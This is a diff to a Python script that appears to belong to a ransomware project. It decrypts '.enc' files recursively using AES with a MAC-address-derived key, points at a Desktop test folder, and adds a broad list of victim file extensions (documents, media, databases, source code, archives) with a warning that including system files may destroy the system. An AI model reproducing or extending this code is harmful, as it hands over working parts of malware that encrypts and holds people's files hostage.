@@ -1,6 +1,3 @@
-import crypto
-import sys
-sys.modules['Crypto'] = crypto
 from Cryptodome.Cipher import AES
 import os.path
 import hashlib
@@ -10,6 +7,27 @@ from uuid import getnode as get_mac
 IV_SIZE = 16    # 128 bit, fixed for the AES algorithm
 KEY_SIZE = 32   # 256 bit meaning AES-256, can also be 128 or 192 bits
 SALT_SIZE = 16  # This size is arbitrary
+
+extensions = [
+        # 'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
+        'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw', # images
+        'mp3','mp4', 'm4a', 'aac','ogg','flac', 'wav', 'wma', 'aiff', 'ape', # music and sound
+        'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp', # Video and movies
+
+        'doc', 'docx', 'xls', 'xlsx', 'ppt','pptx', # Microsoft office
+        'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md', # OpenOffice, Adobe, Latex, Markdown, etc
+        'yml', 'yaml', 'json', 'xml', 'csv', # structured data
+        'db', 'sql', 'dbf', 'mdb', 'iso', # databases and disc images
+
+        'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css', # web technologies
+        'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx', # C source code
+        'java', 'class', 'jar', # java source code
+        'ps', 'bat', 'vb', # windows based scripts
+        'awk', 'sh', 'cgi', 'pl', 'ada', 'swift', # linux/mac based scripts
+        'go', 'py', 'pyc', 'bf', 'coffee', # other source code files
+
+        'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',  # compressed formats
+    ]
 
 def dec_file(base, in_filename, out_filename=None, chunksize=24*1024):
     if not out_filename:
@@ -37,8 +55,10 @@ def search_dec(path):
         files = os.listdir(path)
         for file in files:
             filename = os.path.join(path, file)
+
             if(os.path.isdir(filename)):
                 search_dec(filename)
+
             else:
                 fname, ext = os.path.splitext(filename)
                 if (ext == '.enc'):
@@ -47,8 +67,7 @@ def search_dec(path):
     except PermissionError:
         pass
 
-testPath = 'C:/Users/tmdgh/Desktop/test124/'
-
+testPath = 'C:/Users/tmdgh/Desktop/test123/'
 
 mac = get_mac()
 
